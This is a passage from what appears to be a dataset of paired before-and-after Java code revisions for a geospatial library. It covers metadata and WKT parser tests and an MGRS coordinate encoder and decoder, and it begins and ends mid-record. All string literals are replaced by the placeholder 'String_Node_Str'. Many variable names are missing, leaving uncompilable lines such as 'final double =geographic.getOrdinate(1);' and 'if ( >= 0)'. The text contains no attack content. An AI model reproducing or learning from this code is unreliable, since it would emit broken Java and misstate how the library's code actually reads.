@Test @DependsOnMethod(""String_Node_Str"") public void testPullElement() throws ParseException {
  Element element=parse(""String_Node_Str"");
  assertEquals(""String_Node_Str"",""String_Node_Str"",element.keyword);
  assertEquals(""String_Node_Str"",""String_Node_Str"",element.pullString(""String_Node_Str""));
  Element inner=element.pullElement(AbstractParser.MANDATORY,""String_Node_Str"");
  assertEquals(""String_Node_Str"",""String_Node_Str"",inner.keyword);
  assertEquals(""String_Node_Str"",TestUtilities.date(""String_Node_Str""),inner.pullDate(""String_Node_Str""));
  inner.close(null);
  element.close(null);
}","/** 
 * Tests   {@link Element#pullElement(int,String)}. This implies testing   {@code Element} nesting.
 * @throws ParseException if an error occurred during the parsing.
 */
@Test @DependsOnMethod(""String_Node_Str"") public void testPullElement() throws ParseException {
  Element element=parse(""String_Node_Str"");
  assertEquals(""String_Node_Str"",""String_Node_Str"",element.keyword);
  assertEquals(""String_Node_Str"",""String_Node_Str"",element.pullString(""String_Node_Str""));
  Element inner=element.pullElement(AbstractParser.MANDATORY,""String_Node_Str"");
  assertEquals(""String_Node_Str"",""String_Node_Str"",inner.keyword);
  assertEquals(""String_Node_Str"",TestUtilities.date(""String_Node_Str""),inner.pullDate(""String_Node_Str""));
  inner.close(null);
  element.close(null);
}"
91713,"/** 
 * Tests   {@link Element#close()}.
 * @throws ParseException if an error occurred during the parsing.
 */
@Test public void testClose() throws ParseException {
  final Element element=parse(""String_Node_Str"");
  try {
    element.close(null);
    fail(""String_Node_Str"");
  }
 catch (  ParseException e) {
    assertEquals(""String_Node_Str"",e.getLocalizedMessage());
  }
}","/** 
 * Tests   {@link Element#close(Map)}.
 * @throws ParseException if an error occurred during the parsing.
 */
@Test public void testClose() throws ParseException {
  final Element element=parse(""String_Node_Str"");
  try {
    element.close(null);
    fail(""String_Node_Str"");
  }
 catch (  ParseException e) {
    assertEquals(""String_Node_Str"",e.getLocalizedMessage());
  }
}"
91714,"/** 
 * Tests (indirectly)   {@link Formatter#append(CodeList)}.
 */
@Test public void testAppendCodeList(){
  assertWktEquals(Convention.WKT2,""String_Node_Str"",AxisDirection.NORTH_EAST);
  assertWktEquals(Convention.WKT1,""String_Node_Str"",AxisDirection.NORTH_EAST);
}","/** 
 * Tests (indirectly)   {@link Formatter#append(ControlledVocabulary)}.
 */
@Test public void testAppendCodeList(){
  assertWktEquals(Convention.WKT2,""String_Node_Str"",AxisDirection.NORTH_EAST);
  assertWktEquals(Convention.WKT1,""String_Node_Str"",AxisDirection.NORTH_EAST);
}"
91715,"/** 
 * Tests (indirectly)   {@link Formatter#quote(String)}.
 */
@Test public void testQuote(){
  assertWktEquals(Convention.WKT2,""String_Node_Str"",""String_Node_Str"");
  assertWktEquals(Convention.INTERNAL,""String_Node_Str"",""String_Node_Str"");
  assertWktEquals(Convention.WKT2,""String_Node_Str"",""String_Node_Str"");
  assertWktEquals(Convention.INTERNAL,""String_Node_Str"",""String_Node_Str"");
}","/** 
 * Tests (indirectly)   {@link Formatter#quote(String,ElementKind)}.
 */
@Test public void testQuote(){
  assertWktEquals(Convention.WKT2,""String_Node_Str"",""String_Node_Str"");
  assertWktEquals(Convention.INTERNAL,""String_Node_Str"",""String_Node_Str"");
  assertWktEquals(Convention.WKT2,""String_Node_Str"",""String_Node_Str"");
  assertWktEquals(Convention.INTERNAL,""String_Node_Str"",""String_Node_Str"");
}"
91716,"/** 
 * Tests   {@link MetadataStandard#getAccessor(Class,boolean)}.
 */
@Test @DependsOnMethod(""String_Node_Str"") public void testGetAccessor(){
  standard=MetadataStandard.ISO_19115;
  assertEquals(""String_Node_Str"",Citation.class,getAccessor(DefaultCitation.class,true));
  assertEquals(""String_Node_Str"",Completeness.class,getAccessor(AbstractCompleteness.class,true));
  assertNull(""String_Node_Str"",getAccessor(SimpleIdentifiedObject.class,false));
  standard=MetadataStandard.ISO_19111;
  assertEquals(""String_Node_Str"",Citation.class,getAccessor(DefaultCitation.class,true));
  assertEquals(""String_Node_Str"",Completeness.class,getAccessor(AbstractCompleteness.class,true));
  assertEquals(""String_Node_Str"",IdentifiedObject.class,getAccessor(SimpleIdentifiedObject.class,true));
  testGetInterface();
}","/** 
 * Tests   {@link MetadataStandard#getAccessor(CacheKey,boolean)}.
 */
@Test @DependsOnMethod(""String_Node_Str"") public void testGetAccessor(){
  standard=MetadataStandard.ISO_19115;
  assertEquals(""String_Node_Str"",Citation.class,getAccessor(DefaultCitation.class,true));
  assertEquals(""String_Node_Str"",Completeness.class,getAccessor(AbstractCompleteness.class,true));
  assertNull(""String_Node_Str"",getAccessor(SimpleIdentifiedObject.class,false));
  standard=MetadataStandard.ISO_19111;
  assertEquals(""String_Node_Str"",Citation.class,getAccessor(DefaultCitation.class,true));
  assertEquals(""String_Node_Str"",Completeness.class,getAccessor(AbstractCompleteness.class,true));
  assertEquals(""String_Node_Str"",IdentifiedObject.class,getAccessor(SimpleIdentifiedObject.class,true));
  testGetInterface();
}"
91717,"/** 
 * Tests the   {@link PropertyAccessor#get(int,Object)} method on the {@link HardCodedCitations#ISO} constant.The metadata object read by this test is: {@preformat textDefaultCitation Title International Organization for Standardization Alternate title ISO 19111 Identifier Code 19111 Code space ISO Presentation form Document digital}
 */
@Test @DependsOnMethod(""String_Node_Str"") public void testGet(){
  final DefaultCitation instance=HardCodedCitations.ISO_19111;
  final PropertyAccessor accessor=createPropertyAccessor();
  final Object title=accessor.get(accessor.indexOf(""String_Node_Str"",true),instance);
  assertInstanceOf(""String_Node_Str"",InternationalString.class,title);
  assertEquals(""String_Node_Str"",""String_Node_Str"",title.toString());
  final Object alternateTitles=accessor.get(accessor.indexOf(""String_Node_Str"",true),instance);
  assertInstanceOf(""String_Node_Str"",Collection.class,alternateTitles);
  assertEquals(""String_Node_Str"",""String_Node_Str"",getSingleton((Collection<?>)alternateTitles).toString());
  final Object identifiers=accessor.get(accessor.indexOf(""String_Node_Str"",true),instance);
  assertEquals(""String_Node_Str"",getSingletonCode(identifiers));
}","/** 
 * Tests the   {@link PropertyAccessor#get(int,Object)} method on the {@link HardCodedCitations#ISO_19111} constant.The metadata object read by this test is: {@preformat textDefaultCitation Title International Organization for Standardization Alternate title ISO 19111 Identifier Code 19111 Code space ISO Presentation form Document digital}
 */
@Test @DependsOnMethod(""String_Node_Str"") public void testGet(){
  final DefaultCitation instance=HardCodedCitations.ISO_19111;
  final PropertyAccessor accessor=createPropertyAccessor();
  final Object title=accessor.get(accessor.indexOf(""String_Node_Str"",true),instance);
  assertInstanceOf(""String_Node_Str"",InternationalString.class,title);
  assertEquals(""String_Node_Str"",""String_Node_Str"",title.toString());
  final Object alternateTitles=accessor.get(accessor.indexOf(""String_Node_Str"",true),instance);
  assertInstanceOf(""String_Node_Str"",Collection.class,alternateTitles);
  assertEquals(""String_Node_Str"",""String_Node_Str"",getSingleton((Collection<?>)alternateTitles).toString());
  final Object identifiers=accessor.get(accessor.indexOf(""String_Node_Str"",true),instance);
  assertEquals(""String_Node_Str"",getSingletonCode(identifiers));
}"
91718,"/** 
 * Tests   {@link TreeNode#getElementType()} on a metadata with a hierarchy.
 */
@Test @DependsOnMethod(""String_Node_Str"") public void testGetElementType(){
  final DefaultCitation citation=metadataWithHierarchy();
  assertColumnContentEquals(create(citation,Citation.class,ValueExistencePolicy.NON_EMPTY),TableColumn.TYPE,Citation.class,InternationalString.class,InternationalString.class,InternationalString.class,InternationalString.class,Responsibility.class,Party.class,InternationalString.class,Role.class,Responsibility.class,Party.class,InternationalString.class,Contact.class,Address.class,String.class,Role.class,PresentationForm.class,PresentationForm.class,InternationalString.class);
}","/** 
 * Tests getting the value of   {@link TableColumn#TYPE} on a metadata with a hierarchy.
 */
@Test @DependsOnMethod(""String_Node_Str"") public void testGetElementType(){
  final DefaultCitation citation=metadataWithHierarchy();
  assertColumnContentEquals(create(citation,Citation.class,ValueExistencePolicy.NON_EMPTY),TableColumn.TYPE,Citation.class,InternationalString.class,InternationalString.class,InternationalString.class,InternationalString.class,Responsibility.class,Party.class,InternationalString.class,Role.class,Responsibility.class,Party.class,InternationalString.class,Contact.class,Address.class,String.class,Role.class,PresentationForm.class,PresentationForm.class,InternationalString.class);
}"
91719,"/** 
 * Tests   {@link DefaultMetadata#getHierarchyLevels()},   {@link DefaultMetadata#getHierarchyLevelNames()},  {@link DefaultMetadata#setHierarchyLevel(Collection)} and {@link DefaultMetadata#setHierarchyLevelNames(Collection)}methods.
 */
@Test @SuppressWarnings(""String_Node_Str"") public void testHierarchyLevels(){
  final String[] names=new String[]{""String_Node_Str"",""String_Node_Str""};
  final ScopeCode[] levels=new ScopeCode[]{ScopeCode.FEATURE_TYPE,ScopeCode.FEATURE};
  final DefaultMetadata metadata=new DefaultMetadata();
  assertTrue(""String_Node_Str"",metadata.getHierarchyLevelNames().isEmpty());
  assertTrue(""String_Node_Str"",metadata.getHierarchyLevels().isEmpty());
  metadata.setHierarchyLevelNames(Arrays.asList(names));
  metadata.setHierarchyLevels(Arrays.asList(levels));
  assertArrayEquals(""String_Node_Str"",names,metadata.getHierarchyLevelNames().toArray());
  assertArrayEquals(""String_Node_Str"",levels,metadata.getHierarchyLevels().toArray());
  final Collection<MetadataScope> scopes=metadata.getMetadataScopes();
  final Iterator<MetadataScope> it=scopes.iterator();
  MetadataScope scope=it.next();
  assertEquals(""String_Node_Str"",""String_Node_Str"",scope.getName().toString());
  assertEquals(""String_Node_Str"",ScopeCode.FEATURE_TYPE,scope.getResourceScope());
  scope=it.next();
  assertEquals(""String_Node_Str"",""String_Node_Str"",scope.getName().toString());
  assertEquals(""String_Node_Str"",ScopeCode.FEATURE,scope.getResourceScope());
  it.remove();
  assertFalse(it.hasNext());
  final DefaultMetadataScope c=new DefaultMetadataScope(levels[1]=ScopeCode.ATTRIBUTE_TYPE,names[1]=""String_Node_Str"");
  assertTrue(scopes.add(c));
  assertArrayEquals(""String_Node_Str"",names,metadata.getHierarchyLevelNames().toArray());
  assertArrayEquals(""String_Node_Str"",levels,metadata.getHierarchyLevels().toArray());
  Collection<String> n1=metadata.getHierarchyLevelNames();
  Collection<String> n2=metadata.getHierarchyLevelNames();
  assertNotSame(""String_Node_Str"",n1,n2);
  assertTrue(""String_Node_Str"",n1.equals(n2));
  assertTrue(""String_Node_Str"",n2.equals(n1));
  assertEquals(""String_Node_Str"",n1.hashCode(),n2.hashCode());
}","/** 
 * Tests   {@link DefaultMetadata#getHierarchyLevels()},   {@link DefaultMetadata#getHierarchyLevelNames()},  {@link DefaultMetadata#setHierarchyLevels(Collection)} and {@link DefaultMetadata#setHierarchyLevelNames(Collection)}methods.
 */
@Test @SuppressWarnings(""String_Node_Str"") public void testHierarchyLevels(){
  final String[] names=new String[]{""String_Node_Str"",""String_Node_Str""};
  final ScopeCode[] levels=new ScopeCode[]{ScopeCode.FEATURE_TYPE,ScopeCode.FEATURE};
  final DefaultMetadata metadata=new DefaultMetadata();
  assertTrue(""String_Node_Str"",metadata.getHierarchyLevelNames().isEmpty());
  assertTrue(""String_Node_Str"",metadata.getHierarchyLevels().isEmpty());
  metadata.setHierarchyLevelNames(Arrays.asList(names));
  metadata.setHierarchyLevels(Arrays.asList(levels));
  assertArrayEquals(""String_Node_Str"",names,metadata.getHierarchyLevelNames().toArray());
  assertArrayEquals(""String_Node_Str"",levels,metadata.getHierarchyLevels().toArray());
  final Collection<MetadataScope> scopes=metadata.getMetadataScopes();
  final Iterator<MetadataScope> it=scopes.iterator();
  MetadataScope scope=it.next();
  assertEquals(""String_Node_Str"",""String_Node_Str"",scope.getName().toString());
  assertEquals(""String_Node_Str"",ScopeCode.FEATURE_TYPE,scope.getResourceScope());
  scope=it.next();
  assertEquals(""String_Node_Str"",""String_Node_Str"",scope.getName().toString());
  assertEquals(""String_Node_Str"",ScopeCode.FEATURE,scope.getResourceScope());
  it.remove();
  assertFalse(it.hasNext());
  final DefaultMetadataScope c=new DefaultMetadataScope(levels[1]=ScopeCode.ATTRIBUTE_TYPE,names[1]=""String_Node_Str"");
  assertTrue(scopes.add(c));
  assertArrayEquals(""String_Node_Str"",names,metadata.getHierarchyLevelNames().toArray());
  assertArrayEquals(""String_Node_Str"",levels,metadata.getHierarchyLevels().toArray());
  Collection<String> n1=metadata.getHierarchyLevelNames();
  Collection<String> n2=metadata.getHierarchyLevelNames();
  assertNotSame(""String_Node_Str"",n1,n2);
  assertTrue(""String_Node_Str"",n1.equals(n2));
  assertTrue(""String_Node_Str"",n2.equals(n1));
  assertEquals(""String_Node_Str"",n1.hashCode(),n2.hashCode());
}"
91720,"/** 
 * Tests XML (un)marshalling of a resolution element. The main purpose of this method is to test our workaround for a strange JAXB behavior (bug?).  For an unknown reason, we are unable to annotate the  {@link DefaultResolution#getDistance()} method directly. Doing so cause JAXB to randomly ignores the{@code <gmd:distance>} property. Annotating a separated method which in turn invokes the real methodseems to work. <p>This test creates a  {@link DefaultResolution} instance which is expected to be marshalled as below(ignoring namespace declarations):</p> {@preformat xml<gmd:MD_Resolution> <gmd:distance> <gco:Distance uom=\""http://schemas.opengis.net/iso/19139/20070417/resources/uom/gmxUom.xml#xpointer(//*[@gml:id='m'])\"">1000.0</gco:Distance> </gmd:distance> </gmd:MD_Resolution>}If we annotate the public   {@code getDistance()} directly, JAXB will sometime marshals the resolution asexpected, or sometime marshals an empty element as below: {@preformat xml<gmd:MD_Resolution/>}In the later case, debugging shows that the   {@code getDistance()} method is simply never invoked.Whether the distance is marshaled or not seems totally random: just executing this test many time make both cases to occur (however failures occur more often the successes). <p>Annotating an other method as a workaround seems to always work. See the  {@link DefaultResolution#getValue()}javadoc for instructions about how to check if this workaround is still needed with more recent JAXB versions.</p>
 * @throws JAXBException if an error occurred while marshalling the element.
 * @see DefaultResolution#getValue()
 */
@Test public void testXML() throws JAXBException {
  final DefaultResolution resolution=new DefaultResolution();
  resolution.setDistance(1000.0);
  final String xml=XML.marshal(resolution);
  assertTrue(""String_Node_Str"" + ""String_Node_Str"",xml.contains(""String_Node_Str""));
  assertXmlEquals(""String_Node_Str"" + Namespaces.GMD + '""'+ ""String_Node_Str""+ Namespaces.GCO+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ Schemas.METADATA_ROOT+ Schemas.UOM_PATH+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str"",xml,""String_Node_Str"");
  assertEquals(resolution,XML.unmarshal(xml));
}","/** 
 * Tests XML (un)marshalling of a resolution element. This test creates a   {@link DefaultResolution}instance which is expected to be marshalled as below (ignoring namespace declarations):  {@preformat xml<gmd:MD_Resolution> <gmd:distance> <gco:Distance uom=\""http://schemas.opengis.net/iso/19139/20070417/resources/uom/gmxUom.xml#xpointer(//*[@gml:id='m'])\"">1000.0</gco:Distance> </gmd:distance> </gmd:MD_Resolution>}
 * @throws JAXBException if an error occurred while marshalling the element.
 */
@Test public void testXML() throws JAXBException {
  final DefaultResolution resolution=new DefaultResolution();
  resolution.setDistance(1000.0);
  final String xml=XML.marshal(resolution);
  assertTrue(""String_Node_Str"" + ""String_Node_Str"",xml.contains(""String_Node_Str""));
  assertXmlEquals(""String_Node_Str"" + Namespaces.GMD + '""'+ ""String_Node_Str""+ Namespaces.GCO+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ Schemas.METADATA_ROOT+ Schemas.UOM_PATH+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str"",xml,""String_Node_Str"");
  assertEquals(resolution,XML.unmarshal(xml));
}"
91721,"/** 
 * Verifies that   {@link Zoner#isNorway(double)} and {@link Zoner#isSvalbard(double)}are consistent with the latitude bands.
 */
@Test @DependsOnMethod(""String_Node_Str"") public void verifyZonerConsistency(){
  for (double =TransverseMercator.Zoner.SOUTH_BOUNDS;  < TransverseMercator.Zoner.NORTH_BOUNDS; ++) {
    final String latitude=String.valueOf();
    final char band=MilitaryGridReferenceSystem.Encoder.latitudeBand();
    assertTrue(latitude,band >= 'C' && band <= 'X');
    assertEquals(latitude,band == 'V',TransverseMercator.Zoner.isNorway());
    assertEquals(latitude,band == 'X',TransverseMercator.Zoner.isSvalbard());
  }
}","/** 
 * Verifies that   {@link TransverseMercator.Zoner#isNorway(double)} and{@link TransverseMercator.Zoner#isSvalbard(double)} are consistent with the latitude bands.
 */
@Test @DependsOnMethod(""String_Node_Str"") public void verifyZonerConsistency(){
  for (double =TransverseMercator.Zoner.SOUTH_BOUNDS;  < TransverseMercator.Zoner.NORTH_BOUNDS; ++) {
    final String latitude=String.valueOf();
    final char band=MilitaryGridReferenceSystem.Encoder.latitudeBand();
    assertTrue(latitude,band >= 'C' && band <= 'X');
    assertEquals(latitude,band == 'V',TransverseMercator.Zoner.isNorway());
    assertEquals(latitude,band == 'X',TransverseMercator.Zoner.isSvalbard());
  }
}"
91722,"/** 
 * Encodes the given position into a MGRS reference. It is caller responsibility to ensure that the position CRS is the same than the CRS specified at this   {@code Encoder} creation time.
 * @param owner      the {@code Coder} which own this {@code Encoder}.
 * @param position   the direct position to format as a MGRS reference.
 * @param reproject  whether this method is allowed to reproject {@code position} when needed.
 * @param separator  the separator to insert between each component of the MGRS identifier.
 * @param digits     number of digits to use for formatting the numerical part of a MGRS reference.
 * @return the value of {@code buffer.toString()}, or   {@code null} if a reprojection was necessarybut  {@code reproject} is {@code false}.
 */
String encode(final Coder owner,DirectPosition position,final boolean reproject,final String separator,final int digits) throws FactoryException, TransformException {
  final StringBuilder buffer=owner.buffer;
  if (toNormalized != null) {
    owner.normalized=position=toNormalized.transform(position,owner.normalized);
  }
  final DirectPosition geographic=toGeographic.transform(position,owner.geographic);
  owner.geographic=geographic;
  final double =geographic.getOrdinate(1);
  final double =geographic.getOrdinate(0);
  final boolean isUTM= >= TransverseMercator.Zoner.SOUTH_BOUNDS &&  < TransverseMercator.Zoner.NORTH_BOUNDS;
  final int zone=isUTM ? ZONER.zone(,) : POLE;
  final int signedZone=MathFunctions.isNegative() ? -zone : zone;
  if (signedZone == 0) {
    throw new GazetteerException(Errors.format(Errors.Keys.NotANumber_1,""String_Node_Str""));
  }
  if (signedZone != crsZone) {
    if (!reproject) {
      return null;
    }
    if (signedZone != actualZone) {
      actualZone=0;
      toActualZone=CRS.findOperation(datum.geographic(),datum.universal(,),null).getMathTransform();
      actualZone=signedZone;
    }
    owner.normalized=position=toActualZone.transform(geographic,owner.normalized);
  }
  buffer.setLength(0);
  if (isUTM) {
    buffer.append(zone).append(separator).append(latitudeBand());
  }
 else {
    char z=(signedZone < 0) ? 'A' : 'Y';
    if ( >= 0)     z++;
    buffer.append(z);
  }
  if (digits >= 0) {
    final double x=position.getOrdinate(0);
    final double y=position.getOrdinate(1);
    final double cx=Math.floor(x / GRID_SQUARE_SIZE);
    final double cy=Math.floor(y / GRID_SQUARE_SIZE);
    int col=(int)cx;
    int row=(int)cy;
    if (isUTM) {
      if (col < 1 || col > 8) {
        throw new GazetteerException(Errors.format(Errors.Keys.OutsideDomainOfValidity));
      }
switch (zone % 3) {
case 1:
        col+=('A' - 1);
      break;
case 2:
    col+=('J' - 1);
  if (col >= EXCLUDE_O)   col++;
break;
case 0:
col+=('S' - 1);
break;
}
if ((zone & 1) == 0) {
row+=('F' - 'A');
}
row%=GRID_ROW_COUNT;
}
 else {
final byte[] columns=POLAR_COLUMNS;
col-=(int)(PolarStereographicA.UPS_SHIFT / GRID_SQUARE_SIZE);
if (!( >= 0)) {
col+=columns.length;
}
if (col < 0 || col >= columns.length) {
throw new GazetteerException(Errors.format(Errors.Keys.OutsideDomainOfValidity));
}
col=columns[col];
row-=owner.getReferenceSystem().polarOffset(signedZone < 0);
}
row+='A';
if (row >= EXCLUDE_I && ++row >= EXCLUDE_O) row++;
buffer.append(separator).append(letter(col)).append(letter(row));
if (digits > 0) {
final double precision=MathFunctions.pow10(METRE_PRECISION_DIGITS - digits);
append(buffer.append(separator),(int)((x - cx * GRID_SQUARE_SIZE) / precision),digits);
append(buffer.append(separator),(int)((y - cy * GRID_SQUARE_SIZE) / precision),digits);
}
}
return buffer.toString();
}","/** 
 * Encodes the given position into a MGRS reference. It is caller responsibility to ensure that the position CRS is the same than the CRS specified at this   {@code Encoder} creation time.
 * @param owner      the {@code Coder} which own this {@code Encoder}.
 * @param position   the direct position to format as a MGRS reference.
 * @param reproject  whether this method is allowed to reproject {@code position} when needed.
 * @param separator  the separator to insert between each component of the MGRS identifier.
 * @param digits     number of digits to use for formatting the numerical part of a MGRS reference.
 * @return the value of {@code buffer.toString()}, or   {@code null} if a reprojection was necessarybut  {@code reproject} is {@code false}.
 */
String encode(final Coder owner,DirectPosition position,final boolean reproject,final String separator,final int digits) throws FactoryException, TransformException {
  final StringBuilder buffer=owner.buffer;
  if (toNormalized != null) {
    owner.normalized=position=toNormalized.transform(position,owner.normalized);
  }
  final DirectPosition geographic=toGeographic.transform(position,owner.geographic);
  owner.geographic=geographic;
  final double =geographic.getOrdinate(1);
  final double =geographic.getOrdinate(0);
  final boolean isUTM= >= TransverseMercator.Zoner.SOUTH_BOUNDS &&  < TransverseMercator.Zoner.NORTH_BOUNDS;
  final int zone=isUTM ? ZONER.zone(,) : POLE;
  final int signedZone=MathFunctions.isNegative() ? -zone : zone;
  if (signedZone == 0) {
    throw new GazetteerException(Errors.format(Errors.Keys.NotANumber_1,""String_Node_Str""));
  }
  if (signedZone != crsZone) {
    if (!reproject) {
      return null;
    }
    if (signedZone != actualZone) {
      actualZone=0;
      toActualZone=CRS.findOperation(datum.geographic(),datum.universal(,),null).getMathTransform();
      actualZone=signedZone;
    }
    owner.normalized=position=toActualZone.transform(geographic,owner.normalized);
  }
  buffer.setLength(0);
  if (isUTM) {
    buffer.append(zone).append(separator).append(latitudeBand());
  }
 else {
    char z=(signedZone < 0) ? 'A' : 'Y';
    if ( >= 0)     z++;
    buffer.append(z);
  }
  if (digits >= 0) {
    final double x=position.getOrdinate(0);
    final double y=position.getOrdinate(1);
    final double cx=Math.floor(x / GRID_SQUARE_SIZE);
    final double cy=Math.floor(y / GRID_SQUARE_SIZE);
    int col=(int)cx;
    int row=(int)cy;
    if (isUTM) {
      if (col < 1 || col > 8) {
        throw new GazetteerException(Errors.format(Errors.Keys.OutsideDomainOfValidity));
      }
switch (zone % 3) {
case 1:
        col+=('A' - 1);
      break;
case 2:
    col+=('J' - 1);
  if (col >= EXCLUDE_O)   col++;
break;
case 0:
col+=('S' - 1);
break;
}
if ((zone & 1) == 0) {
row+=('F' - 'A');
}
row%=GRID_ROW_COUNT;
}
 else {
final byte[] columns=POLAR_COLUMNS;
col-=PolarStereographicA.UPS_SHIFT / GRID_SQUARE_SIZE;
if (!( >= 0)) {
col+=columns.length;
}
if (col < 0 || col >= columns.length) {
throw new GazetteerException(Errors.format(Errors.Keys.OutsideDomainOfValidity));
}
col=columns[col];
row-=owner.getReferenceSystem().polarOffset(signedZone < 0);
}
row+='A';
if (row >= EXCLUDE_I && ++row >= EXCLUDE_O) row++;
buffer.append(separator).append(letter(col)).append(letter(row));
if (digits > 0) {
final double precision=MathFunctions.pow10(METRE_PRECISION_DIGITS - digits);
append(buffer.append(separator),(int)((x - cx * GRID_SQUARE_SIZE) / precision),digits);
append(buffer.append(separator),(int)((y - cy * GRID_SQUARE_SIZE) / precision),digits);
}
}
return buffer.toString();
}"
91723,"/** 
 * Decodes the given MGRS reference.
 * @param owner  the {@code Coder} which is creating this {@code Decoder}.
 */
Decoder(final Coder owner,final CharSequence reference) throws TransformException {
  super(owner.getReferenceSystem().rootType(),reference);
  final int zone;
  boolean hasSquareIdentification;
  final double s;
  final double 0;
  boolean isValid=true;
  final int end=CharSequences.skipTrailingWhitespaces(reference,0,reference.length());
  final int base=CharSequences.skipLeadingWhitespaces(reference,0,end);
  int i=endOfDigits(reference,base,end);
  if (i == base && i < end) {
    zone=0;
    boolean south=false;
    boolean west=false;
    int col=0, row=0;
    for (int part=0; part <= 2; part++) {
      int c=Character.codePointAt(reference,i);
      final int ni=i + Character.charCount(c);
      if (isLetter(c) || isLetter(c-=('a' - 'A'))) {
        parse: switch (part) {
case 0:
{
switch (c) {
case 'A':
              south=true;
            west=true;
          break;
case 'B':
        south=true;
      break;
case 'Y':
    west=true;
  break;
case 'Z':
break;
default :
break parse;
}
i=nextComponent(owner,reference,base,ni,end);
continue;
}
case 1:
{
col=Arrays.binarySearch(POLAR_COLUMNS,(byte)c);
if (col < 0) break;
if (west) col-=POLAR_COLUMNS.length;
col+=(int)(PolarStereographicA.UPS_SHIFT / GRID_SQUARE_SIZE);
i=nextComponent(owner,reference,base,ni,end);
continue;
}
case 2:
{
if (c >= EXCLUDE_O) c--;
if (c >= EXCLUDE_I) c--;
row=(c - 'A') + owner.getReferenceSystem().polarOffset(south);
i=ni;
continue;
}
}
}
final short key;
final CharSequence token;
if (part == 0) {
key=Resources.Keys.IllegalUPSZone_1;
token=reference.subSequence(i,ni);
}
 else {
key=Resources.Keys.IllegalSquareIdentification_1;
token=CharSequences.token(reference,i);
}
throw new GazetteerException(Resources.format(key,token));
}
crs=owner.projection(s=(south ? Latitude.MIN_VALUE : Latitude.MAX_VALUE),0);
minX=col * GRID_SQUARE_SIZE;
minY=row * GRID_SQUARE_SIZE;
hasSquareIdentification=true;
0=0;
}
 else {
zone=parseInt(reference,base,i,Resources.Keys.IllegalUTMZone_1);
if (zone < 1 || zone > 60) {
throw new GazetteerException(Resources.format(Resources.Keys.IllegalUTMZone_1,zone));
}
int latitudeBand=-1;
int col=1, row=0;
hasSquareIdentification=true;
for (int part=0; part <= 2; part++) {
if (part == 1 && i >= end) {
hasSquareIdentification=false;
break;
}
i=nextComponent(owner,reference,base,i,end);
int c=Character.codePointAt(reference,i);
final int ni=i + Character.charCount(c);
if (!isLetter(c) && !isLetter(c-=('a' - 'A'))) {
final short key;
final CharSequence token;
if (part == 0) {
key=Resources.Keys.IllegalLatitudeBand_1;
token=reference.subSequence(i,ni);
}
 else {
key=Resources.Keys.IllegalSquareIdentification_1;
token=CharSequences.token(reference,i);
}
throw new GazetteerException(Resources.format(key,token));
}
if (c >= EXCLUDE_O) c--;
if (c >= EXCLUDE_I) c--;
switch (part) {
case 0:
{
latitudeBand=(c - 'C');
break;
}
case 1:
{
switch (zone % 3) {
case 1:
col=c - ('A' - 1);
break;
case 2:
col=c - ('J' - 2);
break;
case 0:
col=c - ('S' - 3);
break;
}
break;
}
case 2:
{
if ((zone & 1) != 0) {
row=c - 'A';
}
 else {
row=c - 'F';
if (row < 0) {
row+=GRID_ROW_COUNT;
}
}
break;
}
}
i=ni;
}
s=latitudeBand * LATITUDE_BAND_HEIGHT + TransverseMercator.Zoner.SOUTH_BOUNDS;
if (latitudeBand < 0 || latitudeBand >= ROW_RESOLVER.length) {
throw new GazetteerException(Resources.format(Resources.Keys.IllegalLatitudeBand_1,Encoder.latitudeBand(s)));
}
0=ZONER.centralMeridian(zone);
crs=owner.projection(Math.signum(s),0);
final int info=ROW_RESOLVER[latitudeBand];
if (hasSquareIdentification) {
int rowBit=1 << (row + NORTHING_BITS_COUNT);
isValid=(info & rowBit) != 0;
if (isValid) {
rowBit=Integer.lowestOneBit(~(info | (rowBit - 1)));
}
if ((info & -rowBit) != 0) {
row+=GRID_ROW_COUNT;
}
}
row+=(info & NORTHING_BITS_MASK) * GRID_ROW_COUNT;
minX=col * GRID_SQUARE_SIZE;
minY=row * GRID_SQUARE_SIZE;
}
final double sx, sy;
if (i < end) {
i=nextComponent(owner,reference,base,i,end);
int s=endOfDigits(reference,i,end);
final double x, y;
if (s >= end) {
int length=s - i;
if ((length & 1) != 0) {
throw new GazetteerException(Resources.format(Resources.Keys.OddGridCoordinateLength_1,reference.subSequence(i,s)));
}
final int h=i + (length>>>=1);
sx=sy=MathFunctions.pow10(METRE_PRECISION_DIGITS - length);
x=parseCoordinate(reference,i,h,sx);
y=parseCoordinate(reference,h,s,sy);
}
 else {
sx=MathFunctions.pow10(METRE_PRECISION_DIGITS - (s - i));
x=parseCoordinate(reference,i,s,sx);
i=nextComponent(owner,reference,base,s,end);
s=endOfDigits(reference,i,end);
sy=MathFunctions.pow10(METRE_PRECISION_DIGITS - (s - i));
y=parseCoordinate(reference,i,s,sy);
if (s < end) {
throw new GazetteerException(Errors.format(Errors.Keys.UnexpectedCharactersAfter_2,reference.subSequence(base,s),CharSequences.trimWhitespaces(reference,s,end)));
}
}
minX+=x;
minY+=y;
}
 else if (hasSquareIdentification) {
sx=sy=GRID_SQUARE_SIZE;
}
 else {
sx=(ZONER.easting - GRID_SQUARE_SIZE) * 2;
sy=ZONER.northing;
}
maxX=minX + sx;
maxY=minY + sy;
if (!hasSquareIdentification) {
if (zone != 0) {
if (s < 0) {
southBoundLatitude=TransverseMercator.Zoner.SOUTH_BOUNDS;
northBoundLatitude=0;
}
 else {
southBoundLatitude=0;
northBoundLatitude=TransverseMercator.Zoner.NORTH_BOUNDS;
}
westBoundLongitude=0 - ZONER.width / 2;
eastBoundLongitude=0 + ZONER.width / 2;
}
 else {
if (s < 0) {
southBoundLatitude=Latitude.MIN_VALUE;
northBoundLatitude=TransverseMercator.Zoner.SOUTH_BOUNDS;
}
 else {
southBoundLatitude=TransverseMercator.Zoner.NORTH_BOUNDS;
northBoundLatitude=Latitude.MAX_VALUE;
}
westBoundLongitude=Longitude.MIN_VALUE;
eastBoundLongitude=Longitude.MAX_VALUE;
}
}
 else {
final MathTransform projection=crs.getConversionFromBase().getMathTransform();
computeGeographicBoundingBox(projection.inverse());
setTypeToChild();
if (sx < GRID_SQUARE_SIZE || sy < GRID_SQUARE_SIZE) {
setTypeToChild();
}
if (isValid && zone != 0) {
final double =(westBoundLongitude + eastBoundLongitude) / 2;
final double =(southBoundLatitude + northBoundLatitude) / 2;
